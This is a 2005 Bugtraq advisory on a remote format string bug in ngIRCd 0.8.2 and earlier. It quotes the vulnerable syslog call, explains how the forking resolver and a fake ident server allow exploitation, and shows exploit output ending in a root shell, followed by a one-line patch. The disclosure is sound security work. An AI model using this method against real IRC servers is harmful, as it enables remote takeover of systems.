@@ -1,0 +1,173 @@
+
+Date: 3 Feb 2005 02:09:09 -0000
+From: CoKi <coki@...ystem.com.ar>
+To: bugtraq@...urityfocus.com
+Subject: ngIRCd <= v0.8.2 Format String Vulnerability
+
+
+
+
+-------------------------------------------------
+No System Group - Advisory #11 - 03/02/05
+-------------------------------------------------
+Program: ngIRCd
+Homepage: http://arthur.ath.cx/~alex/ngircd/
+Operating System: Linux and Unix-Compatible
+Vulnerable Versions: ngIRCd v0.8.2 and prior
+Risk: High
+Impact: Remote Format String Vulnerability
+-------------------------------------------------
+
+
+- DESCRIPTION
+-------------------------------------------------
+ngIRCd is a portable IRC daemon written from scratch.
+It is easy to configure, supports server links (even
+with original ircds) and runs on hosts with changing
+IP addresses (such as dial-in networks). Currently
+supported platforms are AIX, A/UX, Darwin/Mac OS X,
+FreeBSD, HP-UX, IRIX, Linux, NetBSD, SunOS/Solaris,
+and Windows with Cygwin.
+
+More informations at: http://arthur.ath.cx/~alex/ngircd/
+
+
+- DETAILS
+-------------------------------------------------
+Exist a format string bug in the Log_Resolver() function
+of log.c when parses erroneous arguments to the syslog()
+function. This may give a remote shell with privileges of
+ngIRCd, it's 'root' by default.
+
+----------- log.c ------------
+261:         vsnprintf( msg, MAX_LOG_MSG_LEN, Format, ap );
+262:         va_end( ap );
+263: 
+264:         /* Output */
+265:         if( NGIRCd_NoDaemon )
+266:         {
+267:                 /* Output to console */
+268:                 fprintf( stdout, "[%d:%d] %s\n", (INT)getpid( ), Level, msg );
+269:                 fflush( stdout );
+270:         }
+271: #ifdef SYSLOG
+272:         else syslog( Level, msg );
+273: #endif
+----------- log.c ------------
+
+Here we can look that exist a format string vulnerability
+in 272 line of log.c
+
+
+- EXPLOIT
+-------------------------------------------------
+To obtain a successful exploitation, we need that
+ngIRCd has been compiled with IDENT, logging to
+SYSLOG and DEBUG enabled.
+
+We now will look a part of the code of resolve.c:
+
+----------- resolve.c ------------
+96:         /* For sub-process */
+97:          pid = fork( );
+98:          if( pid > 0 )
+99:          {
+100:                 /* Main process */
+101:                 Log( LOG_DEBUG, "Resolver for %s created (PID %d).", inet_ntoa( Addr->sin_addr ), pid );
+102:                 FD_SET( s->pipe[0], &Resolver_FDs );
+103:                 if( s->pipe[0] > Conn_MaxFD ) Conn_MaxFD = s->pipe[0];
+104:                 s->pid = pid;
+105:                 s->stage = 0;
+106:                 s->bufpos = 0;
+107:                 return s;
+108:         }
+
+[...]
+
+230: #ifdef IDENTAUTH
+231:         /* Do "IDENT" (aka "AUTH") lookup and write result to parent */
+232:         Log_Resolver( LOG_DEBUG, "Doing IDENT lookup on socket %d ...", Sock );
+233:         res = ident_id( Sock, 10 );
+234:         Log_Resolver( LOG_DEBUG, "Ok, IDENT lookup on socket %d done: \"%s\"", Sock, res ? res : "" );
+235: 
+236:         /* Write IDENT result into pipe to parent */
+237:         len = strlen( res ? res : "" );
+238:         if( res != NULL ) res[len] = '\n';
+239:         len++;
+240:         if( (size_t)write( w_fd, res ? res : "\n", len ) != (size_t)len )
+241:         {
+242:                 Log_Resolver( LOG_CRIT, "Resolver: Can't write to parent (IDENT): %s!", strerror( errno ));
+243:                 close( w_fd );
+244:         }
+245:         free( res );
+246: #endif
+----------- resolve.c ------------
+
+At 97 lines of resolve.c we can see that is
+created a new process with fork() function,
+this will allow us to obtain the exact address
+of RET of automatic way without ircd dies.
+We can see too that this process do IDENT lookup
+when a host is connected to the ircd daemon,
+and using the vulnerable function for logging
+with syslog at 242 lines of this code.
+
+I have written a code exploit that use this
+method for obtain a root shell in the target.
+
+http://www.nosystem.com.ar/exploits/ngircd_fsexp.c
+
+root@...vidor:/home/coki/audit# ./ngircd_fsexp -h victim -t 1 -o 10000
+
+ ngIRCd <= 0.8.2 remote format string exploit
+ by CoKi <coki@...ystem.com.ar>
+
+ [*] host                       : victim
+ [*] system                     : Slackware Linux 10.0
+ [*] ircd version               : ngircd-0.8.2.tar.gz
+ [*] syslog GOT address         : 0x08068094
+ [*] verifying host             : 10.0.0.2
+
+ [*] trying RET address         : 0x0806d710 (offset 10000)
+ [*] building evil buffer       : done!
+ [*] running fake ident server  : 0.0.0.0:113
+
+ [*] connecting to ircd...      : 10.0.0.2:6667 connected
+ [*] waiting for answer...      : 10.0.0.1:43260 connected
+ [*] sending evil ident...      : done!
+ [*] checking for shell...      : done!
+
+ [!] you have a shell :)
+
+Linux victim 2.4.26 #29 Mon Jun 14 19:22:30 PDT 2004 i686 unknown unknown GNU/Linux
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+
+
+- SOLUTIONS
+-------------------------------------------------
+The patch is included here:
+
+--- src/ngircd/log.c    2004-06-26 06:06:27.000000000 -0300
++++ src/ngircd/log.c.patch      2005-02-02 12:53:33.000000000 -0300
+@@ -269,7 +269,7 @@
+                fflush( stdout );
+        }
+ #ifdef SYSLOG
+-       else syslog( Level, msg );
++       else syslog( Level, "%s", msg );
+ #endif
+ } /* Log_Resolver */
+
+
+- REFERENCES
+-------------------------------------------------
+http://www.nosystem.com.ar/advisories/advisory-11.txt
+
+
+- CREDITS
+-------------------------------------------------
+Discovered by CoKi <coki@...ystem.com.ar>
+
+No System Group - http://www.nosystem.com.ar
+
+
